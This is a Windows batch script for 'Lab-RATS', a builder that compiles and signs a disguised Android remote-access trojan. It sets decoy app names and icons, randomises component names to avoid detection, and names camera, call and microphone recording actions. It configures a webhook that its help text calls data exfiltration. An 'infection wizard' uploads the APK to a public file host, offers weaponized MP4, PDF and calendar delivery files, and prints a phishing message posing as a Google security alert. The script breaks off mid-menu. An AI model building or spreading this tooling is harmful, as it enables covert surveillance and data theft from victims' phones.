@echo off
setlocal EnableDelayedExpansion
chcp 65001 >nul 2>&1

REM #################################################
REM #                   Lab-RATS                    #
REM #                                               #
REM #        Android APK BUILDER - Windows          #
REM #                v1.5.1 Hardened                #
REM #                                               #
REM #             Developed by: K4N3CO              #
REM #################################################

title Lab-RATS APK Builder v1.5.1 - by K4N3CO

REM Get script directory
set "SCRIPT_DIR=%~dp0"
set "PROJECT_DIR=%SCRIPT_DIR%.."
set "CONFIG_FILE=%SCRIPT_DIR%build_config.txt"

goto :main_menu

:print_banner
cls
echo [96m ┌───────────────────────────────────────────────────────────────────────┐[0m
echo [96m │                                  .-         .                         │[0m
echo [96m │                               ....-        :                          │[0m
echo [96m │                            -==--+:.+. ..  -..+:-+                     │[0m
echo [96m │                            ++---:+.-==+==#:.+---+#                    │[0m
echo [96m │                             :=---:+++++=++=**-:-:                     │[0m
echo [96m │                               --+++:-=+++++++-=                       │[0m
echo [96m │                  .-.         :--+==:++-:-**+-+-                       │[0m
echo [96m │                    -.     .==:--+:+++=++++++++#.                      │[0m
echo [96m │                    :-    =---=::-++.=:.=.-==+....                     │[0m
echo [96m │                   -+   .=-=++===-:.---=::-.-:==...-.==.               │[0m
echo [96m │                 .==    =--=:=-=++:+:--::-==--...=+-+=+-:              │[0m
echo [96m │               ..==.   ---++=:-++++++++===+++=+..:=-*-+:.              │[0m
echo [96m │                :==    -:-.+:-=++-+++++##++=---=++::=+.                │[0m
echo [96m │                .-=:  .---=++++-++++#####*++..::--. .                  │[0m
echo [96m │                 .--++.--:----=+---=-++#++==.       .                  │[0m
echo [96m │                   --------=--:=:-:-====+++-                           │[0m
echo [96m │                       .--++++--++:+++==:=+.                           │[0m
echo [96m │                        .:+++::::--:..:-+=                             │[0m
echo [96m │                       .--=+=-+-+    -:---*---                         │[0m
echo [96m │                                                                       │[0m
echo [96m │     ██╗      █████╗ ██████╗       ██████╗  █████╗ ████████╗██████╗    │[0m
echo [96m │     ██║     ██╔══██╗██╔══██╗      ██╔══██╗██╔══██╗╚══██╔══╝██╔═══╝    │[0m
echo [96m │     ██║     ███████║██████╔╝█████╗██████╔╝███████║   ██║   ██████╗    │[0m
echo [96m │     ██║     ██╔══██║██╔══██╗╚════╝██╔══██╗██╔══██║   ██║   ╚════█║    │[0m
echo [96m │     ███████╗██║  ██║██████╔╝      ██║  ██║██║  ██║   ██║   ██████║    │[0m
echo [96m │     ╚══════╝╚═╝  ╚═╝╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═════╝    │[0m
echo [96m │                                                                       │[0m
echo [96m │     ----------> Android APK Builder | v1.5.1 Hardened <----------     │[0m
echo [96m │                                                                       │[0m
echo [96m │   The one's who MIND don't matter. The one's who MATTER don't mind.   │[0m
echo [96m │                         DEVELOPED BY K4N3CO                           │[0m
echo [96m │                               © 2026                                  │[0m
echo [96m └───────────────────────────────────────────────────────────────────────┘[0m
echo.
goto :eof

:check_requirements
echo [96m[*] Checking requirements...[0m
echo.

REM Check Java
where java >nul 2>nul
if %errorlevel% neq 0 (
    echo [91m[!] Java is not installed.[0m
    echo.
    echo [95m[^>] Options:[0m
    echo     1. Auto-install Java (download from web)
    echo     2. Show manual installation instructions
    echo     3. Skip (I'll install later)
    echo.
    set /p "JAVA_OPTION=    Choose option (Default 2): "
    if "!JAVA_OPTION!"=="" set "JAVA_OPTION=2"
    
    if "!JAVA_OPTION!"=="1" (
        call :install_java
    ) else if "!JAVA_OPTION!"=="2" (
        call :show_manual_java_install
        pause
        exit /b 1
    ) else (
        echo [93m[!] Skipping Java check. Build may fail.[0m
    )
) else (
    set "JAVA_VERSION=unknown"
    for /f "tokens=3" %%g in ('java -version 2^>^&1 ^| findstr /i "version"') do (
        set "FULL_VER=%%g"
        set "FULL_VER=!FULL_VER:"=!"
        for /f "tokens=1 delims=." %%v in ("!FULL_VER!") do (
            if "%%v"=="1" (
                for /f "tokens=2 delims=." %%s in ("!FULL_VER!") do set "JAVA_VERSION=%%s"
            ) else (
                set "JAVA_VERSION=%%v"
            )
        )
        echo [92m[✓] Java !JAVA_VERSION! detected (!FULL_VER!)[0m
    )

    if !JAVA_VERSION! gtr 21 (
        echo [93m[!] WARNING: Java !JAVA_VERSION! is very new. Recommended: 17 or 21.[0m
        echo [93m    Build may fail with 'Unsupported class file major version'.[0m
    ) else if !JAVA_VERSION! lss 17 (
        echo [93m[!] WARNING: Java !JAVA_VERSION! is old. Recommended: 17 or 21.[0m
    )
)

REM Check keytool
where keytool >nul 2>nul
if %errorlevel% equ 0 (
    echo [92m[✓] keytool found[0m
) else (
    echo [93m[!] keytool not found. Usually comes with JDK.[0m
)

REM Check PowerShell (needed for regex)
where powershell >nul 2>nul
if %errorlevel% equ 0 (
    echo [92m[✓] PowerShell available[0m
) else (
    echo [91m[!] PowerShell not found. Required for build configuration.[0m
    pause
    exit /b 1
)

echo.
goto :eof

:install_java
echo [96m[*] Opening Java download page...[0m
echo [93m    Please download and install JDK 17 or 21 from:[0m
echo     https://adoptium.net/temurin/releases/
echo.
start "" "https://adoptium.net/temurin/releases/"
echo [93m[!] After installing Java, restart this script.[0m
pause
exit /b 1

:show_manual_java_install
echo.
echo [96m╔══════════════════════════════════════════════════════════════╗[0m
echo [96m║              MANUAL JAVA INSTALLATION GUIDE                  ║[0m
echo [96m╚══════════════════════════════════════════════════════════════╝[0m
echo.
echo [97mOption 1: Download from Adoptium (Recommended)[0m
echo     1. Go to: https://adoptium.net/temurin/releases/
echo     2. Download "JDK 17" or "JDK 21" for Windows x64
echo     3. Run the installer (choose "Add to PATH")
echo     4. Restart this script
echo.
echo [97mOption 2: Using winget (Windows 11)[0m
echo     winget install EclipseAdoptium.Temurin.17.JDK
echo.
echo [97mOption 3: Using Chocolatey[0m
echo     choco install temurin17
echo.
goto :eof

:generate_keystore
set "KEYSTORE_PATH=%PROJECT_DIR%\lab-rats-keystore.jks"

REM Default values
set "KEY_ALIAS=lab-rats-key"
set "KEYSTORE_PASS=lab-rats123"
set "CN_NAME=Lab-RATS Developer"
set "ORG_NAME=Lab-RATS.LABS"
set "COUNTRY=US"
set "VALIDITY_DAYS=9125"

if exist "%KEYSTORE_PATH%" (
    if "%AUTO_KEYSTORE%"=="1" (
        echo [92m[OK] Keystore already exists[0m
        goto :eof
    )
    echo [93m[!] Keystore already exists at: %KEYSTORE_PATH%[0m
    set /p "REGENERATE=    Generate new keystore? (y/N): "
    if /i not "!REGENERATE!"=="y" (
        echo [92m[OK] Using existing keystore[0m
        goto :eof
    )
    del "%KEYSTORE_PATH%" >nul 2>nul
)

if not "%AUTO_KEYSTORE%"=="1" (
    echo [96m[*] Keystore Configuration[0m
    echo.
    echo [95m[^>] Enter keystore details (press Enter for defaults):[0m
    echo.
    set /p "KEY_ALIAS=    Key alias [lab-rats-key]: "
    if "!KEY_ALIAS!"=="" set "KEY_ALIAS=lab-rats-key"
    set /p "KEYSTORE_PASS=    Keystore password [lab-rats123]: "
    if "!KEYSTORE_PASS!"=="" set "KEYSTORE_PASS=lab-rats123"
    set /p "CN_NAME=    Your name [Lab-RATS Developer]: "
    if "!CN_NAME!"=="" set "CN_NAME=Lab-RATS Developer"
    set /p "ORG_NAME=    Organization [Lab-RATS.LABS]: "
    if "!ORG_NAME!"=="" set "ORG_NAME=Lab-RATSBS"
    set /p "COUNTRY=    Country code [US]: "
    if "!COUNTRY!"=="" set "COUNTRY=US"
) else (
    echo [96m[*] Auto-generating keystore with default values...[0m
)

echo.
echo [96m[*] Generating keystore...[0m

keytool -genkeypair -alias "!KEY_ALIAS!" -keyalg RSA -keysize 2048 -validity !VALIDITY_DAYS! -keystore "%KEYSTORE_PATH%" -storepass "!KEYSTORE_PASS!" -keypass "!KEYSTORE_PASS!" -dname "CN=!CN_NAME!, O=!ORG_NAME!, C=!COUNTRY!" 2>nul

if %errorlevel% equ 0 (
    echo [92m[OK] Keystore generated successfully![0m
    echo.
    
    REM Create keystore.properties for Gradle
    set "KEYSTORE_PROPS=%PROJECT_DIR%\keystore.properties"
    echo storeFile=lab-rats-keystore.jks> "!KEYSTORE_PROPS!"
    echo storePassword=!KEYSTORE_PASS!>> "!KEYSTORE_PROPS!"
    echo keyAlias=!KEY_ALIAS!>> "!KEYSTORE_PROPS!"
    echo keyPassword=!KEYSTORE_PASS!>> "!KEYSTORE_PROPS!"
    echo [92m[OK] Created keystore.properties for Gradle[0m
    
    REM Save to config
    echo KEYSTORE_PATH=%KEYSTORE_PATH%> "%CONFIG_FILE%"
    echo KEY_ALIAS=!KEY_ALIAS!>> "%CONFIG_FILE%"
    echo KEYSTORE_PASS=!KEYSTORE_PASS!>> "%CONFIG_FILE%"
    
    if not "%AUTO_KEYSTORE%"=="1" (
        REM Show certificate info
        echo [96m[*] Certificate fingerprint:[0m
        keytool -list -v -keystore "%KEYSTORE_PATH%" -storepass "!KEYSTORE_PASS!" -alias "!KEY_ALIAS!" 2>nul | findstr "SHA256:"
        echo.
    )
) else (
    echo [91m[!] Failed to generate keystore[0m
    if not "%AUTO_KEYSTORE%"=="1" pause
    exit /b 1
)
goto :eof

:configure_app
echo [96m[*] App Configuration[0m
echo.

set "STRINGS_FILE=%PROJECT_DIR%\app\src\main\res\values\strings.xml"
set "BUILD_GRADLE=%PROJECT_DIR%\app\build.gradle"

REM Generate random defaults for stealth
set /a RAND_MAJOR=%RANDOM% %% 4 + 1
set /a RAND_MINOR=%RANDOM% %% 10
set /a RAND_PATCH=%RANDOM% %% 10
set "DEF_VER=!RAND_MAJOR!.!RAND_MINOR!.!RAND_PATCH!"
set "DEF_SDK=21"

REM App Name
echo [95m[^>] Enter App Name [System Stability Service]:[0m
set /p "APP_NAME=    "
if "!APP_NAME!"=="" set "APP_NAME=System Stability Service"

REM Package Name
echo [95m[^>] Enter Package Name (Application ID) [com.android.system.stability]:[0m
set /p "PKG_NAME=    "
if "!PKG_NAME!"=="" set "PKG_NAME=com.android.system.stability"

REM Version Name
echo [95m[^>] Enter Version Name [!DEF_VER!]:[0m
set /p "VERSION_NAME=    "
if "!VERSION_NAME!"=="" set "VERSION_NAME=!DEF_VER!"

REM Min SDK
echo [95m[^>] Enter Min SDK [!DEF_SDK!]:[0m
set /p "MIN_SDK=    "
if "!MIN_SDK!"=="" set "MIN_SDK=!DEF_SDK!"

REM Update build.gradle using PowerShell for reliability with regex replacement
if exist "%BUILD_GRADLE%" (
    REM Update Application ID
    powershell -Command "(Get-Content '%BUILD_GRADLE%') -replace 'applicationId \"[^\"]+\"', 'applicationId \"!PKG_NAME!\"' | Set-Content '%BUILD_GRADLE%'"
    
    REM Update Min SDK
    powershell -Command "(Get-Content '%BUILD_GRADLE%') -replace 'minSdk \d+', 'minSdk !MIN_SDK!' | Set-Content '%BUILD_GRADLE%'"
    
    REM Update Version Code (auto increment or random)
    set /a "VERSION_CODE=!RANDOM! %% 1000 + 10"
    powershell -Command "(Get-Content '%BUILD_GRADLE%') -replace 'versionCode [0-9]+', 'versionCode !VERSION_CODE!' | Set-Content '%BUILD_GRADLE%'"

    REM Update Version Name
    powershell -Command "(Get-Content '%BUILD_GRADLE%') -replace 'versionName \".*\"', 'versionName \"!VERSION_NAME!\"' | Set-Content '%BUILD_GRADLE%'"
    
    echo [92m[✓] build.gradle updated (Pkg: !PKG_NAME!, MinSdk: !MIN_SDK!, Ver: !VERSION_NAME!)[0m
)

REM Update strings.xml
if exist "%STRINGS_FILE%" (
    powershell -Command "(Get-Content '%STRINGS_FILE%') -replace '<string name=\"app_name\">.*</string>', '<string name=\"app_name\">!APP_NAME!</string>' | Set-Content '%STRINGS_FILE%'"
    echo [92m[✓] App name set to: !APP_NAME![0m
)

REM Save to config
echo APP_NAME="!APP_NAME!"> "%CONFIG_FILE%"
echo VERSION_NAME="!VERSION_NAME!">> "%CONFIG_FILE%"
echo MIN_SDK="!MIN_SDK!">> "%CONFIG_FILE%"
echo PKG_NAME="!PKG_NAME!">> "%CONFIG_FILE%"

echo.
echo [95m[^>] Decoy Identity Selection[0m
echo [93m    (The app logo will transform into your selection immediately after install on device)[0m
echo     1. System Update (Gear)  2. Calculator
echo     3. Weather               4. Settings
echo     5. Lab-RATS Logo
echo.
set /p "DECOY_CHOICE=    Choice (Default 1): "
if "!DECOY_CHOICE!"=="" set "DECOY_CHOICE=1"

echo DECOY_CHOICE="!DECOY_CHOICE!">> "%CONFIG_FILE%"

set "LOCAL_PROPS=%PROJECT_DIR%\local.properties"
powershell -Command "if (Test-Path '%LOCAL_PROPS%') { $content = Get-Content '%LOCAL_PROPS%'; if ($content -match 'DECOY_CHOICE=') { $content -replace 'DECOY_CHOICE=.*', 'DECOY_CHOICE=!DECOY_CHOICE!' | Set-Content '%LOCAL_PROPS%' } else { Add-Content '%LOCAL_PROPS%' '`nDECOY_CHOICE=!DECOY_CHOICE!' } } else { Set-Content '%LOCAL_PROPS%' 'DECOY_CHOICE=!DECOY_CHOICE!' }"

REM Google Sheet URL
echo.
echo [95m[^>] Google Sheet Webhook Configuration[0m
echo [93m    Enter Webhook URL (Google Script):[0m
set /p "WEB_URL=    "

set "LOCAL_PROPS=%PROJECT_DIR%\local.properties"
if not "!WEB_URL!"=="" (
    REM Update local.properties for Gradle
    powershell -Command "if (Test-Path '!LOCAL_PROPS!') { $content = Get-Content '!LOCAL_PROPS!'; if ($content -match 'WEBHOOK_URL=') { $content -replace 'WEBHOOK_URL=.*', 'WEBHOOK_URL=!WEB_URL!' | Set-Content '!LOCAL_PROPS!' } else { Add-Content '!LOCAL_PROPS!' 'WEBHOOK_URL=!WEB_URL!' } } else { Set-Content '!LOCAL_PROPS!' 'WEBHOOK_URL=!WEB_URL!' }"
    echo [92m[✓] Webhook URL saved to local.properties[0m
)

echo.
echo.

REM --- DYNAMIC OBFUSCATION PROTOCOL ---
echo [96m[*] Configuring Dynamic Obfuscation...[0m

REM 1. Generate Dynamic Encryption Key
powershell -Command "$k = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 16 | ForEach-Object {[char]$_}); echo $k" > temp_key.txt
set /p RAND_KEY=<temp_key.txt
del temp_key.txt

set "LOCAL_PROPS=%PROJECT_DIR%\local.properties"
powershell -Command "if (Test-Path '%LOCAL_PROPS%') { $content = Get-Content '%LOCAL_PROPS%'; if ($content -match 'ENCRYPTION_KEY=') { $content -replace 'ENCRYPTION_KEY=.*', 'ENCRYPTION_KEY=%RAND_KEY%' | Set-Content '%LOCAL_PROPS%' } else { Add-Content '%LOCAL_PROPS%' 'ENCRYPTION_KEY=%RAND_KEY%' } } else { Set-Content '%LOCAL_PROPS%' 'ENCRYPTION_KEY=%RAND_KEY%' }"

REM 2. Add Binary Signature Entropy
set "SYS_DIR=%PROJECT_DIR%\app\src\main\assets\sys"
if not exist "%SYS_DIR%" mkdir "%SYS_DIR%"
for /L %%i in (1,1,3) do (
    powershell -Command "$data = New-Object Byte[] 512; (New-Object System.Security.Cryptography.RNGCryptoServiceProvider).GetBytes($data); [System.IO.File]::WriteAllBytes('%SYS_DIR%\metadata_%%i.dat', $data)"
)

REM 3. Randomize Intent Actions in Constants.java
set "CONSTANTS_JAVA=%PROJECT_DIR%\app\src\main\java\com\labs\labrats\Constants.java"
set "MANIFEST=%PROJECT_DIR%\app\src\main\AndroidManifest.xml"
powershell -Command "$prefix = 'com.labs.' + (-join ((97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})); echo $prefix" > temp_prefix.txt
set /p ACT_PREFIX=<temp_prefix.txt
del temp_prefix.txt

set "ACTION_FIELDS=ACTION_AUTO_START ACTION_KEEP_ALIVE ACTION_START_STREAM ACTION_STOP_STREAM ACTION_CAPTURE_PHOTO ACTION_START_RECORDING ACTION_STOP_RECORDING ACTION_STOP_OPTICS ACTION_START_CORE ACTION_STOP_CORE ACTION_START_CALL_REC ACTION_STOP_CALL_REC ACTION_START_MIC_REC ACTION_STOP_MIC_REC ACTION_CALL_STATE_CHANGED ACTION_UPDATE_AUDIO_SETTINGS ACTION_STOP_AUDIO ACTION_START_AUDIO"

for %%F in (%ACTION_FIELDS%) do (
    powershell -Command "$r = '%ACT_PREFIX%.' + (-join ((65..90) + (48..57) | Get-Random -Count 12 | ForEach-Object {[char]$_})); echo $r" > temp_act.txt
    set /p RAND_ACTION=<temp_act.txt
    del temp_act.txt

    powershell -Command "(Get-Content '%CONSTANTS_JAVA%') -replace 'public static final String %%F = \".*\";', 'public static final String %%F = \"!RAND_ACTION!\";' | Set-Content '%CONSTANTS_JAVA%'"

    if "%%F"=="ACTION_AUTO_START" (
        powershell -Command "(Get-Content '%MANIFEST%') -replace 'com\.labs\.stability\.ST_P_01', '!RAND_ACTION!' | Set-Content '%MANIFEST%'"
    )
    if "%%F"=="ACTION_KEEP_ALIVE" (
        powershell -Command "(Get-Content '%MANIFEST%') -replace 'com\.labs\.stability\.ST_P_02', '!RAND_ACTION!' | Set-Content '%MANIFEST%'"
    )
)

REM 4. Service/Receiver Randomization
powershell -Command "$p = -join ((97..122) | Get-Random -Count 4 | ForEach-Object {[char]$_}); echo $p" > temp_p.txt
set /p PREFIX=<temp_p.txt
del temp_p.txt

set "ENTITIES=WorkManager_Sync Analytics_Provider MediaFrameworkService StatusNotification IO_Persistence_Manager TelephonyState SystemBoot InstallReferrerReceiver"
set "MAPPING_FILE=%SCRIPT_DIR%build_mapping.txt"
if exist "%MAPPING_FILE%" del "%MAPPING_FILE%"

for %%E in (%ENTITIES%) do (
    powershell -Command "$r = '%PREFIX%_' + (-join ((97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})); echo $r" > temp_r.txt
    set /p RAND_NAME=<temp_r.txt
    del temp_r.txt

    echo %%E:!RAND_NAME!>> "%MAPPING_FILE%"

    REM Update Manifest
    powershell -Command "(Get-Content '%MANIFEST%') -replace '\.%%E', '.!RAND_NAME!' | Set-Content '%MANIFEST%'"

    REM Update all Java files and rename
    powershell -Command "$ents = Get-ChildItem -Path '%PROJECT_DIR%\app\src\main\java' -Filter '*.java' -Recurse; foreach($f in $ents) { (Get-Content $f.FullName) -replace '\b%%E\b', '!RAND_NAME!' | Set-Content $f.FullName }"
    powershell -Command "$f = Get-ChildItem -Path '%PROJECT_DIR%\app\src\main\java' -Filter '%%E.java' -Recurse; if($f) { Rename-Item $f.FullName -NewName '!RAND_NAME!.java' }"
)

goto :eof

:build_apk
call :print_banner
echo [96m[*] Initializing Build Engine...[0m
echo.

cd /d "%PROJECT_DIR%"

REM Load config if exists
if exist "%CONFIG_FILE%" (
    for /f "usebackq tokens=1,2 delims==" %%a in ("%CONFIG_FILE%") do (
        set "val=%%b"
        REM Remove quotes if present
        set "val=!val:"=!"
        set "%%a=!val!"
    )
)

REM Check if keystore exists - auto-generate if not
set "KEYSTORE_FILE=%PROJECT_DIR%\lab-rats-keystore.jks"
if not exist "!KEYSTORE_FILE!" (
    echo [93m[!] No keystore found. Auto-generating...[0m
    set "AUTO_KEYSTORE=1"
    call :generate_keystore
    set "AUTO_KEYSTORE="
    echo.
)

REM Create output folder
set "OUTPUT_DIR=%SCRIPT_DIR%output"
if not exist "!OUTPUT_DIR!" mkdir "!OUTPUT_DIR!"

REM Generate timestamp
for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value 2^>nul') do set datetime=%%I
set "TIMESTAMP=!datetime:~0,8!_!datetime:~8,6!"

REM Create safe app name
set "APP_NAME_SAFE=!APP_NAME: =_!"
if "!APP_NAME_SAFE!"=="" set "APP_NAME_SAFE=System_Stability_Service"
if "!VERSION_NAME!"=="" set "VERSION_NAME=2.0"

set "APK_FOUND=0"

REM ---------------------------------------------------------
REM 1. Build Signed APK
REM ---------------------------------------------------------
echo [94m[1/2] Generating Signed Production APK[0m
set "TASK_LABEL=Compiling Resources & Signing"
echo | set /p="    [*] !TASK_LABEL! ["
start /b cmd /c "gradlew.bat clean assembleRelease --no-daemon > build_log.txt 2>&1"
set "PID=$!"

REM Simulate progress with Finalizing detection
for /L %%i in (1,1,38) do (
    set /a "percent=%%i * 100 / 40"
    echo | set /p="█"
    timeout /t 1 >nul
)
echo | set /p="] 95%% [93m[FINALIZING...][0m"

:wait_signed
REM Fast loop using ping for sub-second delay
ping 127.0.0.1 -n 1 -w 500 >nul
tasklist /fi "imagename eq java.exe" | find ":" >nul
if errorlevel 1 goto wait_signed
echo.
echo     [92m[DONE][0m

REM Signed release APK
set "RELEASE_APK=%PROJECT_DIR%\app\build\outputs\apk\release\app-release.apk"
if exist "!RELEASE_APK!" (
    set "OUTPUT_SIGNED=!OUTPUT_DIR!\!APP_NAME_SAFE!-v!VERSION_NAME!-signed.apk"
    copy /Y "!RELEASE_APK!" "!OUTPUT_SIGNED!" >nul
    echo     [92m[✓] Saved: !APP_NAME_SAFE!-v!VERSION_NAME!-signed.apk[0m
    set "APK_FOUND=1"
) else (
    echo     [91m[!] Signed APK generation failed. Check build_log.txt[0m
)

echo.

REM ---------------------------------------------------------
REM 2. Build Unsigned APK
REM ---------------------------------------------------------
echo [94m[2/2] Generating Unsigned Debug APK[0m
set "TASK_LABEL=Packaging Assets"
echo | set /p="    [*] !TASK_LABEL! ["
start /b cmd /c "gradlew.bat assembleRelease -PdisableSigning --no-daemon > build_log.txt 2>&1"

for /L %%i in (1,1,38) do (
    set /a "percent=%%i * 100 / 40"
    echo | set /p="█"
    timeout /t 1 >nul
)
echo | set /p="] 95%% [93m[FINALIZING...][0m"

:wait_unsigned
ping 127.0.0.1 -n 1 -w 500 >nul
tasklist /fi "imagename eq java.exe" | find ":" >nul
if errorlevel 1 goto wait_unsigned
echo.
echo     [92m[DONE][0m

REM Unsigned release APK
set "UNSIGNED_APK=%PROJECT_DIR%\app\build\outputs\apk\release\app-release-unsigned.apk"

REM Fallback check
if not exist "!UNSIGNED_APK!" (
    set "UNSIGNED_APK_FALLBACK=%PROJECT_DIR%\app\build\outputs\apk\release\app-release.apk"
    if exist "!UNSIGNED_APK_FALLBACK!" set "UNSIGNED_APK=!UNSIGNED_APK_FALLBACK!"
)

if exist "!UNSIGNED_APK!" (
    set "OUTPUT_UNSIGNED=!OUTPUT_DIR!\!APP_NAME_SAFE!-v!VERSION_NAME!-unsigned.apk"
    copy /Y "!UNSIGNED_APK!" "!OUTPUT_UNSIGNED!" >nul
    echo     [92m[✓] Saved: !APP_NAME_SAFE!-v!VERSION_NAME!-unsigned.apk[0m
    set "APK_FOUND=1"
) else (
    echo     [91m[!] Unsigned APK generation failed. Check build_log.txt[0m
)

REM Revert obfuscation mapping to restore source for next build or editing
set "MAPPING_FILE=%SCRIPT_DIR%build_mapping.txt"
if exist "%MAPPING_FILE%" (
    echo [96m[*] Restoring source tree...[0m
    set "MANIFEST=%PROJECT_DIR%\app\src\main\AndroidManifest.xml"
    for /f "tokens=1,2 delims=:" %%a in (%MAPPING_FILE%) do (
        set "ENTITY=%%a"
        set "RAND=%%b"

        REM Update Manifest
        powershell -Command "(Get-Content '!MANIFEST!') -replace '\.!RAND!', '.!ENTITY!' | Set-Content '!MANIFEST!'"

        REM Update all Java files and rename back
        powershell -Command "$ents = Get-ChildItem -Path '%PROJECT_DIR%\app\src\main\java' -Filter '*.java' -Recurse; foreach($f in $ents) { (Get-Content $f.FullName) -replace '\b!RAND!\b', '!ENTITY!' | Set-Content $f.FullName }"
        powershell -Command "$f = Get-ChildItem -Path '%PROJECT_DIR%\app\src\main\java' -Filter '!RAND!.java' -Recurse; if($f) { Rename-Item $f.FullName -NewName '!ENTITY!.java' }"
    )
    del "%MAPPING_FILE%"
)

if "!APK_FOUND!"=="0" (
    echo.
    echo [91m╔══════════════════════════════════════════════════════════════╗[0m
    echo [91m║                      BUILD FAILED!                           ║[0m
    echo [91m╚══════════════════════════════════════════════════════════════╝[0m
    echo.
    echo [91m[!] No APK files found. Check errors in build_log.txt[0m
    pause
    exit /b 1
)

echo.
echo [92m╔══════════════════════════════════════════════════════════════╗[0m
echo [92m║                    BUILD SUCCESSFUL!                         ║[0m
echo [92m╚══════════════════════════════════════════════════════════════╝[0m
echo.
echo [92m[✓] APKs saved to: !OUTPUT_DIR![0m
echo.
goto :eof

:main_menu
call :print_banner

echo [95m[^>] Build Options:[0m
echo.
echo     1. Start Build (Configure & Build)
echo     2. Generate Keystore Only
echo     3. Configure App Settings Only
echo     4. Check/Install Requirements
echo     5. Generate Infection Chain Package (Wizard)
echo     6. Help / Documentation
echo     7. Exit
echo.
set /p "MENU_OPTION=    Choose option (Default 1): "
if "!MENU_OPTION!"=="" set "MENU_OPTION=1"

echo.

if "!MENU_OPTION!"=="1" (
    call :check_requirements
    if %errorlevel% neq 0 exit /b 1
    call :generate_keystore
    call :configure_app
    call :build_apk
) else if "!MENU_OPTION!"=="2" (
    call :check_requirements
    if %errorlevel% neq 0 exit /b 1
    call :generate_keystore
) else if "!MENU_OPTION!"=="3" (
    call :configure_app
) else if "!MENU_OPTION!"=="4" (
    call :configure_app
) else if "!MENU_OPTION!"=="5" (
    call :check_requirements
    call :show_manual_java_install
    echo.
    echo [93mPress any key to return to menu...[0m
    pause >nul
) else if "!MENU_OPTION!"=="6" (
    call :infection_wizard
) else if "!MENU_OPTION!"=="7" (
    call :show_help
) else if "!MENU_OPTION!"=="8" (
    echo [96m[*] Goodbye![0m
    echo [95m    Follow: https://github.com/K4N3CO/Lab-RATS[0m
    exit /b 0
) else (
    echo [91m[!] Invalid option[0m
    pause
    exit /b 1
)

echo.
echo [92m[✓] Done![0m
echo.
pause
goto :eof

:show_help
call :print_banner
echo [97mCOMMAND_DOCUMENTATION_V1.5.1[0m
echo ------------------------------------------------------------
echo [96m1. Start Build:[0m Full automated process. Configures everything
echo    and produces a signed APK ready for installation.
echo.
echo [96m2. Keystore Only:[0m Generates a unique security certificate
echo    used to sign the APK. Prevents Play Protect flags.
echo.
echo [96m3. App Settings:[0m Change Package ID, App Name, and set
echo    your Webhook URL for data exfiltration.
echo.
echo [96m4. Requirements:[0m Verifies Java/JDK and ImageMagick setup.
echo.
echo [96m5. Infection Wizard:[0m The most powerful tool. It builds your
echo    APK, hosts it anonymously, weaponizes a PDF/MP4 with the
echo    link, and writes your phishing message. Full-chain auto.
echo ------------------------------------------------------------
pause
goto :main_menu
goto :eof

:infection_wizard
call :print_banner
echo [91m[>] STRATEGIC_INFECTION_WIZARD[0m
echo [93m    Step-by-step automated payload weaponization.[0m
echo.

REM 1. Build Payload
echo [96m[1/4] Building Stealth APK...[0m
call :check_requirements
set "AUTO_KEYSTORE=1"
call :generate_keystore
call :configure_app
call :build_apk

REM Identify APK
for /f "delims=" %%i in ('dir /b /s "%SCRIPT_DIR%output\*-signed.apk"') do set "SIGNED_APK=%%i"
if not exist "!SIGNED_APK!" (
    echo [91m[!] Build failed. Infection chain aborted.[0m
    pause
    goto :main_menu
)

REM 2. Host Payload
echo.
echo [96m[2/4] Hosting Payload for Bootstrap...[0m
set "DOWNLOAD_URL="
echo [93m[*] Uploading to Catbox.moe...[0m
powershell -Command "$resp = curl.exe -F 'reqtype=fileupload' -F 'fileToUpload=@!SIGNED_APK!' https://catbox.moe/user/api.php; if($resp -match 'http') { echo $resp } else { exit 1 }" > temp_url.txt
set /p DOWNLOAD_URL=<temp_url.txt
del temp_url.txt
if "!DOWNLOAD_URL!"=="" (
    echo [91m[!] Auto-hosting failed. Manual hosting required.[0m
    set /p "DOWNLOAD_URL=    Enter your manual download link: "
) else (
    echo [92m[✓] Hosted Successfully: !DOWNLOAD_URL![0m
)

REM 3. Weaponize
echo.
echo [96m[3/4] Weaponizing Delivery Vehicle...[0m
echo      1. Zero-Click MP4 (Media Payload)
echo      2. Stealth PDF (Document Payload)
echo      3. Meeting Invite (Calendar Payload)
echo.
set /p "VECTOR=      Select Vector (Default 1): "
if "!VECTOR!"=="" set "VECTOR=1"

if "!VECTOR!"=="1" (
    call :generate_exploit_standalone "mp4" "!DOWNLOAD_URL!"
) else if "!VECTOR!"=="2" (
    call :generate_exploit_standalone "pdf" "!DOWNLOAD_URL!"
) else if "!VECTOR!"=="3" (
    call :generate_exploit_standalone "ics" "!DOWNLOAD_URL!"
)

REM 4. Phishing Deployment
echo.
echo [96m[4/4] Deployment Sequence Generated[0m
echo [92m------------------------------------------------------------[0m
echo [97mPHISHING TEMPLATE:[0m
echo Target: WhatsApp / SMS
echo Message: (SYSTEM ALERT) Unauthorized sign-in attempt on your Google account. To secure your device and review details, download the system patch here: !DOWNLOAD_URL!
echo [92m------------------------------------------------------------[0m
echo.
echo [93m[*] All files ready in apk-builder\output\ folder.[0m
pause
goto :main_menu
goto :eof

:exploit_menu
call :print_banner
echo [95m[^>] Weaponized Payload Lab (Es-rat Tier)[0m
echo.
echo     1. Generate Zero-Click MP4 (Heap Overflow)
echo     2. Generate PDF JavaScript (Auto-Download)
echo     3. Generate Calendar Injection (.ics)
echo     4. Generate PWA WebAPK Manifest
echo     5. Back to Main Menu
echo.
set /p "EXPLOIT_OPTION=    Choose option (Default 1): "
if "!EXPLOIT_OPTION!"=="" set "EXPLOIT_OPTION=1"

set "C2_URL=http://127.0.0.1:8080"

if "!EXPLOIT_OPTION!"=="1" (
    call :generate_exploit_standalone "mp4" ""
) else if "!EXPLOIT_OPTION!"=="2" (
    set /p "TITLE=    Enter PDF Title [URGENT_DOCUMENT]: "
    if "!TITLE!"=="" set "TITLE=URGENT_DOCUMENT"
    call :generate_exploit_standalone "pdf" "!TITLE!"
) else if "!EXPLOIT_OPTION!"=="3" (
    set /p "SUMMARY=    Enter Meeting Summary [Meeting_Invite]: "
    if "!SUMMARY!"=="" set "SUMMARY=Meeting_Invite"
    call :generate_exploit_standalone "ics" "!SUMMARY!"
) else if "!EXPLOIT_OPTION!"=="4" (
    call :generate_exploit_standalone "pwa" ""
) else if "!EXPLOIT_OPTION!"=="5" (
